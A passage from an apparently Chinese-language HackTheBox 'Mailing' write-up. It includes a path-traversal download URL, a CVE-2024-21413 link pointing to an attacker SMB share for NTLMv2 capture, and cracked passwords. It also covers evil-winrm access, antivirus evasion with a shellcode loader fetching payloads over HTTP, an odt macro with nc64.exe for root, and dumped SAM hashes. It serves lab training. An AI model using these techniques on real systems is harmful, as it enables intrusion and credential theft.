md5(sha1($pass)), HC: 4400  md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR:</span></span><br><span class="line"><span class="string">dynamic_33 md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900</span></span><br><span class="line"><span class="string">JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt </span></span><br></pre></td></tr></table></figure>
+
+<p>於是跑一下 hashcat，得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505032918-ky5ctnu.png" alt="image">​</p>
+<p>也就是管理員的密碼： <code>homenetworkingadministrator</code>​</p>
+<h2 id="0xFF-Rabbit-Hole-但也不完全算是"><a href="#0xFF-Rabbit-Hole-但也不完全算是" class="headerlink" title="0xFF Rabbit Hole 但也不完全算是"></a>0xFF <del>Rabbit Hole</del> 但也不完全算是</h2><p>由於有了密碼之後不知道可以幹什麽，不過看到本地安裝的服務器目錄 <code>Database</code>​ 下面有一個數據庫的東西：<code>hMailServer.sdf</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505191638-uyeqdc1.png" alt="image">​</p>
+<p>然後嘗試下載對面的數據庫文件：<code>http://mailing.htb/download.php?file=..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Database\hMailServer.sdf</code>​</p>
+<p>嘗試找一個 sdf 文件查看器，找到 <code>CompactView</code>​ : <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/compactview/">https://sourceforge.net/projects/compactview/</a> 可以用來打開sdf文件，</p>
+<p>不過很可惜，打開後出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505192036-7aaif0y.png" alt="image">.</p>
+<p>顯示需要密碼，如果能成功的找出密碼是怎麽來的，那就好辦。</p>
+<p>搜索了 <code>hmailserver database sdf password</code>​ 看到：</p>
+<blockquote>
+<p>Just to make it clear:</p>
+<ol>
+<li>Run DecryptBlowfish.vbs</li>
+<li>Enter your hMailServer Administrator password, as entered during the installation, for example secret123</li>
+<li>Enter the encrypted password, as found under the [Database] section in hMailServer.ini, for example ec3a24b75bc26d9ee498f186efd8586f</li>
+</ol>
+<p>If you enter a incorrect value in step 1 or step 2 (just an additional space before or after is enough) then you might see a decrypted password containing special characters (since the proper password can’t be encrypted)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hmailserver/hmailserver/issues/198">https://github.com/hmailserver/hmailserver/issues/198</a></p>
+</blockquote>
+<p>也就是說如果知道 <code>hMailServer.INI</code>​ 的 <code>AdministratorPassword</code>​ 明文，就可以解密數據庫文件。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505192446-ct5h6zx.png" alt="image">​</p>
+<p>根據提示輸入：<code>homenetworkingadministrator</code>​ 和 <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>​ 后</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040424-f6gu491.png" alt="image">​</p>
+<p>得到 <code>6FC6F69152AD</code>​，嘗試解密：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040436-40m1y0k.png" alt="image">​</p>
+<p>結果解密成功：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040702-ux9izsr.png" alt="image">​</p>
+<p>得到三個用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">maya@mailing.htb</span><br><span class="line">ruy@mailing.htb</span><br><span class="line">administrator@mailing.htb</span><br></pre></td></tr></table></figure>
+
+<p>有趣的事情是我點開了 <code>hm_messages</code>​ 后有一堆郵件的文件列表：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505193157-cy06fmg.png" alt="image">​</p>
+<p>但是這個只是路徑，所以我嘗試搜索郵件放在哪裏</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505193719-a7i8ot4.png" alt="image">​</p>
+<p>看到了這個：</p>
+<blockquote>
+<p>The mail server could not deliver the message to you since the file C:\Program Files\hMailServer\Data\mail.localhost\ham\EE{EEE653FE-EF6C-4AEE-A124-A4EDD0F1A4DB}.eml does not exist on the server.</p>
+<p>The file may have been deleted by anti virus software running on the server.</p>
+<p><a target="_blank" rel="noopener" href="https://hmailserver.com/forum/viewtopic.php?t=27646">https://hmailserver.com/forum/viewtopic.php?t=27646</a></p>
+</blockquote>
+<p>他隱約的告訴你一件事就是接收方郵件是放在： <code>C:\Program Files\hMailServer\Data\&lt;domain&gt;\&lt;username&gt;\&lt;messagefilename的前兩個大寫字母&gt;\郵件序列號.eml</code>​</p>
+<p>由於服務器是32位，所以要換成 <code>C:\Program Files (x86)\hMailServer</code>​</p>
+<p>但是數據庫下面的全都是發送方，并沒有接收方，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505194216-tyu6tnn.png" alt="image">​</p>
+<p>還好裏面只有幾個用戶，於是就猜是發送到<code>maya</code>​的郵件，根據上面的信息和數據庫的信息拼接一個出來：<code>C:\Program Files (x86)\hMailServer\Data\mailing.htb\maya\7B\&#123;7BF5F14B-21CE-452A-9707-7AE434E338F5&#125;.eml</code>​</p>
+<p>得到了一串郵件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505194732-z01eqkz.png" alt="image">​</p>
+<p>翻到底部看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;a href=<span class="string">&quot;file:///\192.168.0.117\test\test.txt!poc&quot;</span>&gt;CVE-2024-21413 PoC.&lt;/a&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-CVE-2024-21413-to-maya"><a href="#0x4-CVE-2024-21413-to-maya" class="headerlink" title="0x4 CVE-2024-21413 to maya"></a>0x4 CVE-2024-21413 to maya</h2><p>既然知道郵件裏面給了提示就試試看，然後找到：<a target="_blank" rel="noopener" href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability</a></p>
+<p>這個POC是說儅一封郵件裏面有連接，用戶使用outlook客戶端就會點擊這個鏈接，就會得到NTLMv2或者RCE。看到郵件是通過smb去截取<code>ntlmv2</code>​，剛好 poc 也是發送有smb的鏈接，於是就是用POC開啓responser看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505052635-6427fne.png" alt="image">​</p>
+<p>果然得到了一個<code>ntlmv2</code>​的hash，嘗試使用 hashcat 破解 <code>ntlmv2</code>​結果得到了一個密碼 <code>m4y4ngs4ri</code>​ 。</p>
+<p>隨手掃一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.41.69  -u <span class="string">&#x27;maya&#x27;</span> -p <span class="string">&#x27;m4y4ngs4ri&#x27;</span></span><br><span class="line">SMB         10.129.41.69    445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.41.69    445    MAILING          [+] MAILING\maya:m4y4ngs4ri </span><br><span class="line"></span><br><span class="line">$ netexec smb 10.129.41.69  -u <span class="string">&#x27;maya&#x27;</span> -p <span class="string">&#x27;m4y4ngs4ri&#x27;</span> --shares</span><br><span class="line">SMB         10.129.41.69    445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.41.69    445    MAILING          [+] MAILING\maya:m4y4ngs4ri </span><br><span class="line">SMB         10.129.41.69    445    MAILING          [*] Enumerated shares</span><br><span class="line">SMB         10.129.41.69    445    MAILING          Share           Permissions     Remark</span><br><span class="line">SMB         10.129.41.69    445    MAILING          -----           -----------     ------</span><br><span class="line">SMB         10.129.41.69    445    MAILING          ADMIN$                          Admin remota</span><br><span class="line">SMB         10.129.41.69    445    MAILING          C$                              Recurso predeterminado</span><br><span class="line">SMB         10.129.41.69    445    MAILING          Important Documents READ        </span><br><span class="line">SMB         10.129.41.69    445    MAILING          IPC$            READ            IPC remota</span><br></pre></td></tr></table></figure>
+
+<p>smb 裏面有一個文件是 <code>Important Documents</code>​，但是是空空如也。。。</p>
+<p>於是嘗試winrm，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505044257-n33e2z2.png" alt="image">​</p>
+<p>好吧，確實有在winrm組裏面，使用 <code>evil-winrm</code>​ 就可以鏈接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.129.44.231 -u <span class="string">&#x27;maya&#x27;</span> -p <span class="string">&#x27;m4y4ngs4ri&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-Root"><a href="#0x5-Root" class="headerlink" title="0x5 Root"></a>0x5 Root</h2><p>裏面有殺毒軟件，<del>於是只能手動枚舉了</del>（最後忍不住還是自動了）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\mane&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\mane</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          5/5/2024   2:06 PM          36184 winPEAS.bat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\mane&gt; .\winPEAS.bat</span><br><span class="line">Program <span class="string">&#x27;winPEAS.bat&#x27;</span> failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1</span><br><span class="line">+ .\winPEAS.bat</span><br><span class="line">+ ~~~~~~~~~~~~~.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ .\winPEAS.bat</span><br><span class="line">+ ~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandFailed</span><br></pre></td></tr></table></figure>
+
+<p>由於有可惡的殺毒軟件，我的peas無法運行，我想起了我的項目shellcode loader：<a target="_blank" rel="noopener" href="https://github.com/manesec/shellcodeloader4mane/tree/main/load-FromHTTP-C">https://github.com/manesec/shellcodeloader4mane/tree/main/load-FromHTTP-C</a></p>
+<p>由於編譯完成后會被殺，我通過修改特徵來嘗試繞過殺軟。如果把shellcode放到http服務器，這樣就會比較小幾率殺掉我的 <code>shellcodeloader.exe</code>​（這裏是 <code>sleep.exe</code>​），所以我修改了代碼來減少特徵碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506013546-k0nx062.png" alt="image">​</p>
+<p>隨便修改了后，編譯得到 <code>sheep.exe</code>​，用 <code>donut-maker</code>​ 準備下winpeas的shellcode：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /Tools/Tools/Tools4mane/Tools/donut-maker.py -i winPEASx64.exe -o sleep.bin -a 2 </span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>sleep.bin</code>​，把loader上傳到對面的服務器上運行看看會不會被殺：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506013256-y9dhb1u.png" alt="image">​</p>
+<p>他沒有殺掉我的 <code>sleep.exe</code>​，winpeas也可以正常加載。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506014307-6rmi6w6.png" alt="image">​</p>
+<p>看起來看到計劃任務有點怪怪的，不過你也可以通過命令手動枚舉計劃任務：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\maya\Documents&gt; schtasks /query /v /fo LIST</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">HostName:                             MAILING                                           </span><br><span class="line">TaskName:                             \Test                                             </span><br><span class="line">Next Run Time:                        N/A                                                                                                                                             </span><br><span class="line">Status:                               Running                                           </span><br><span class="line">Logon Mode:                           Interactive/Background</span><br><span class="line">Last Run Time:                        2024-05-05 7:26:53 PM</span><br><span class="line">Last Result:                          267009  </span><br><span class="line">Author:                               MAILING\maya                                      </span><br><span class="line">Task To Run:                          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Users\localadmin\Documents\scripts\soffice.ps1</span><br><span class="line">Start In:                             N/A</span><br><span class="line">Comment:                              N/A</span><br><span class="line">Scheduled Task State:                 Enabled  </span><br><span class="line">Idle Time:                            Disabled</span><br><span class="line">Power Management:                     Stop On Battery Mode</span><br><span class="line">Run As User:                          localadmin                      </span><br><span class="line">Delete Task If Not Rescheduled:       Disabled</span><br><span class="line">Stop Task If Runs X Hours and X Mins: Disabled</span><br><span class="line">Schedule:                             Scheduling data is not available <span class="keyword">in</span> this format.</span><br><span class="line">Schedule Type:                        At logon time                                                                                                                                   </span><br><span class="line">Start Time:                           N/A</span><br><span class="line">Start Date:                           N/A</span><br><span class="line">End Date:                             N/A</span><br><span class="line">Days:                                 N/A</span><br><span class="line">Months:                               N/A</span><br><span class="line">Repeat: Every:                        N/A</span><br><span class="line">Repeat: Until: Time:                  N/A</span><br><span class="line">Repeat: Until: Duration:              N/A</span><br><span class="line">Repeat: Stop If Still Running:        N/A</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>然後看看根目錄有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         4/10/2024   5:32 PM                Important Documents</span><br><span class="line">d-----         2/28/2024   8:49 PM                inetpub</span><br><span class="line">d-----          5/5/2024   2:19 PM                mane</span><br><span class="line">d-----         12/7/2019  10:14 AM                PerfLogs</span><br><span class="line">d-----          3/9/2024   1:47 PM                PHP</span><br><span class="line">d-r---         3/13/2024   4:49 PM                Program Files</span><br><span class="line">d-r---         3/14/2024   3:24 PM                Program Files (x86)</span><br><span class="line">d-r---          3/3/2024   4:19 PM                Users</span><br><span class="line">d-----         4/29/2024   6:58 PM                Windows</span><br><span class="line">d-----         4/12/2024   5:54 AM                wwwroot</span><br></pre></td></tr></table></figure>
+
+<p>​<code>Important Documents</code>​ 這裏有一個文件夾在根目錄，然後結合smb，讓我想起了之前的mist機器。</p>
+<p>嘗試手動枚舉應用程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         2/27/2024   5:30 PM                Common Files</span><br><span class="line">d-----          3/3/2024   4:40 PM                dotnet</span><br><span class="line">d-----          3/3/2024   4:32 PM                Git</span><br><span class="line">d-----         4/29/2024   6:54 PM                Internet Explorer</span><br><span class="line">d-----          3/4/2024   6:57 PM                LibreOffice</span><br><span class="line">d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools</span><br><span class="line">d-----         12/7/2019  10:14 AM                ModifiableWindowsApps</span><br><span class="line">d-----         2/27/2024   4:58 PM                MSBuild</span><br><span class="line">d-----         2/27/2024   5:30 PM                OpenSSL-Win64</span><br><span class="line">d-----         3/13/2024   4:49 PM                PackageManagement</span><br><span class="line">d-----         2/27/2024   4:58 PM                Reference Assemblies</span><br><span class="line">d-----         3/13/2024   4:48 PM                RUXIM</span><br><span class="line">d-----         2/27/2024   4:32 PM                VMware</span><br><span class="line">d-----          3/3/2024   5:13 PM                Windows Defender</span><br><span class="line">d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection</span><br><span class="line">d-----          3/3/2024   5:13 PM                Windows Mail</span><br><span class="line">d-----          3/3/2024   5:13 PM                Windows Media Player</span><br><span class="line">d-----         4/29/2024   6:54 PM                Windows Multimedia Platform</span><br><span class="line">d-----         2/27/2024   4:26 PM                Windows NT</span><br><span class="line">d-----          3/3/2024   5:13 PM                Windows Photo Viewer</span><br><span class="line">d-----         4/29/2024   6:54 PM                Windows Portable Devices</span><br><span class="line">d-----         12/7/2019  10:31 AM                Windows Security</span><br><span class="line">d-----         3/13/2024   4:49 PM                WindowsPowerShell</span><br></pre></td></tr></table></figure>
+
+<p>很神奇的一件事是居然有安裝 <code>LibreOffice</code>​，等下怎麽哪裏感覺怪怪。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\LibreOffice&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\LibreOffice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----          3/4/2024   6:57 PM                <span class="built_in">help</span></span><br><span class="line">d-----          3/4/2024   6:57 PM                presets</span><br><span class="line">d-----         3/14/2024   4:01 PM                program</span><br><span class="line">d-----          3/4/2024   6:57 PM                readmes</span><br><span class="line">d-----          3/4/2024   6:57 PM                share</span><br><span class="line">-a----         6/10/2022   4:14 PM        1807470 CREDITS.fodt</span><br><span class="line">-a----          7/7/2022   1:05 PM         574491 LICENSE.html</span><br><span class="line">-a----          7/7/2022   1:09 PM         503055 license.txt</span><br><span class="line">-a----          7/6/2022  11:40 PM           3706 NOTICE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這個時間很不對經，大部分的日期是 <code>3/4/2024</code>​ ，但是  <code>program</code>​ 是 <code>3/14/2024</code>​ ，這個也太新了（通常不是太離譜我也當作看不到）</p>
+<p>然後進行排序了下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\LibreOffice\program&gt; (gci . -r | <span class="built_in">sort</span> -Descending LastWriteTime | <span class="keyword">select</span> -first 100) | Select-Object -Property LastWriteTime,FullName </span><br></pre></td></tr></table></figure>
+
+<p>可以看到裏面有兩個文件時間新得離譜：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505201310-b28z3y1.png" alt="image">​</p>
+<p>看看這兩個文件裏面有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\LibreOffice\program&gt; <span class="built_in">type</span> soffice.bat</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">start <span class="string">&quot;&quot;</span> <span class="string">&quot;C:\Program Files\LibreOffice\program\soffice.exe&quot;</span> <span class="string">&quot;C:\Users\Public\Documents\*.odt&quot;</span> --norestore</span><br><span class="line"><span class="built_in">timeout</span> /t 2 &gt;nul</span><br><span class="line">taskkill /f /im soffice.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\LibreOffice\program&gt; <span class="built_in">type</span> soffice.ps1</span><br><span class="line"><span class="comment"># Set the directory where the .odt files are located</span></span><br><span class="line"><span class="variable">$directory</span> = <span class="string">&quot;C:\Users\Public\Documents&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all files with .odt extension in the specified directory</span></span><br><span class="line"><span class="variable">$files</span> = Get-ChildItem -Path <span class="variable">$directory</span> -Filter *.odt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop through each .odt file and open it</span></span><br><span class="line">foreach (<span class="variable">$file</span> <span class="keyword">in</span> <span class="variable">$files</span>) &#123;</span><br><span class="line">    Start-Process <span class="variable">$file</span>.FullName</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>啊，又是經典的老套路，odt macro 可以執行一個叫 <code>shell</code>​的function，參考：<a target="_blank" rel="noopener" href="https://medium.com/@blueclps080984/proving-grounds-craft-intermediate-windowsbox-walkthrough-a-journey-to-offensive-security-83b0f30d1488">https://medium.com/@blueclps080984/proving-grounds-craft-intermediate-windowsbox-walkthrough-a-journey-to-offensive-security-83b0f30d1488</a></p>
+<p>然後發現上傳 nc64.exe 不會被刪，於是：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505201902-lcv3zf6.png" alt="image">​</p>
+<p>把他上傳到 <code>C:\Users\Public\Documents</code>​，等了一段時間什麽也沒有。然後又想起了 <code>C:\Important Documents</code>​，上傳odt到這裏看看，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505202543-hptwqwu.png" alt="image">​</p>
+<p>等了一段時間，就得到了root。</p>
+<p>‍</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump -system system -sam sam <span class="built_in">local</span></span><br><span class="line">Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xe48032e07c396415754917a5cddd064e</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::</span><br><span class="line">localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::</span><br><span class="line">maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::</span><br><span class="line">[-] NTDSHashes.__init__() got an unexpected keyword argument <span class="string">&#x27;ldapFilter&#x27;</span></span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="0xA-Outof-the-box"><a href="#0xA-Outof-the-box" class="headerlink" title="0xA Outof the box"></a>0xA Outof the box</h2><p>在之前的可以看到計劃任務中可以看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(MAILING\maya) MailPython: python.exe C:\Users\maya\Documents\mail.py                                                                                                               </span><br><span class="line">Permissions file: maya [AllAccess]                                                                                                                                                  </span><br><span class="line">Permissions folder(DLL Hijacking): maya [AllAccess]                                                                                                                                 </span><br><span class="line">Trigger: At <span class="built_in">log</span> on of MAILING\maya                                                                                                                                                    </span><br></pre></td></tr></table></figure>
+
+<p>看看這個脚本的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\maya\Documents&gt; <span class="built_in">type</span> C:\Users\maya\Documents\mail.py   </span><br><span class="line">from pywinauto.application import Application</span><br><span class="line">from pywinauto import Desktop</span><br><span class="line">from pywinauto.keyboard import send_keys</span><br><span class="line">from time import <span class="built_in">sleep</span></span><br><span class="line"></span><br><span class="line">app = Application(backend=<span 